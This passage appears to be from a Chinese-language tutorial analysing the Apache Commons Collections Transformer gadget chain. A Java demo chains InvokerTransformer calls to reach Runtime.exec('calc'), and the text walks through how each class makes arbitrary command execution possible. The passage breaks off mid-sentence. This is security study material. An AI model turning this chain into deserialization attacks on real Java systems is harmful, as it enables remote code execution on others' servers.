  public static void main(String[] args) {        String cmd = "calc";
        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(                        "getMethod",                        new Class[]{String.class, Class[].class},                        new Object[]{"getRuntime", new Class[0]}                ),                new InvokerTransformer(                        "invoke",                        new Class[]{Object.class, Object[].class},                        new Object[]{null, new Object[0]}                ),                new InvokerTransformer(                        "exec",                        new Class[]{String.class},                        new Object[]{cmd}                )        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);        outerMap.put("ccc", "lll");
    }

首先得知道transformer是什么东东

![](../Images/bc8cf63beeefe55d22c613772dfddb0a.png)

他是个接口类，且只有一个需要实现的方法，注意，上述虽然是new了Transformer，实际上是进行了类型转换，返回了接口对象。进一步需要知道ConstantTransformer：

![](../Images/8a7aa899537f7da0b77f98267f6c4cb1.png)

对象返回赋值到iConstant，然后实现函数返回iConstant。接下来是InvokerTransformer

![](../Images/e84bf6eba30702f1ed1a881132b8c226.png)

![](../Images/eb1686eb7a8f63e31c8e67b647f25037.png)

构造函数里有三个参数，传入类名，传入参数列表类型，传入参数列表。然后就是赋值。接着我们看transform方法干了什么

![](../Images/8c7e218c30f43736b83801280cc5a8dd.png)

通过反射实现input类，然后调用iMethodName方法，我们就可以考虑在这来实现任意代码执行。demo代码使用了数组将三个对象依次放入数组中，这里我们先看ChainedTransformer的作用

![](../Images/848f7c2c9c41ff8788bbad385d927935.png)

这里看到ChainedTransformer构造函数单纯的赋值，transform函数是将iTransformers数组遍历，便将上一个的返回结果作为下一个Transformer的返回值。按照这个思路，再观察调用链就可依次实现命令调用。简单的说
